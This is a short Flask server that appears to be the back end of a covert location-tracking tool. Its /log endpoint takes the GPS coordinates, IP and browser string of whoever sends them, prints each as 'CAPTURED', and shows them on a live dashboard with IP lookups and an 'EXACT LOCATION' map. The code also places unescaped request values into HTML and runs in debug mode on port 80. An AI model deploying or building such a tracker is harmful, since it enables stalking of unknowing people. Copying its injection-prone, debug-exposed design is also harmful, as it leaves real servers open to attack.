from flask import Flask, request
from datetime import datetime
app = Flask(__name__)
logs = []

@app.route('/')
def dashboard():
    html = '<h1>📍 LIVE LOCATION DASHBOARD</h1><table border=1 style="width:100%"><tr><th>Time</th><th>IP</th><th>GPS</th><th>Accuracy</th><th>🗺️ MAP</th></tr>'
    for log in logs[-20:]:
        html += f'<tr><td>{log["time"]}</td><td><a href="https://ipinfo.io/{log["ip"]}" target="_blank">{log["ip"]}</a></td><td>{log["lat"]},{log["lon"]}</td><td>{log["acc"]}m</td><td><a href="/map/{log["lat"]}/{log["lon"]}" target="_blank">🗺️ OPEN MAP</a></td></tr>'
    html += '</table><script>setTimeout(()=>location.reload(),2000)</script>'
    return html

@app.route('/log')
def log_location():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    acc = request.args.get('accuracy', 9999)
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    
    logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'ip': ip,
        'lat': lat,
        'lon': lon,
        'acc': acc,
        'ua': ua
    })
    
    print(f"🎯 CAPTURED: {lat},{lon} (Accuracy: {acc}m) from {ip}")
    return 'SUCCESS'

@app.route('/map/<lat>/<lon>')
def show_map(lat, lon):
    return f'''
    <h1 style="text-align:center">🎯 EXACT LOCATION</h1>
    <div style="font-size:28px;color:red;text-align:center;font-weight:bold">{lat}, {lon}</div>
    <iframe width="100%" height="600" 
    src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d50!2d{lon}!3d{lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0:0x0!2z{lat},{lon}!5e0!3m2!1sen!2sus!4v1" 
    allowfullscreen style="border:0"></iframe>
    <br><a href="/" style="font-size:20px">← Dashboard</a>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
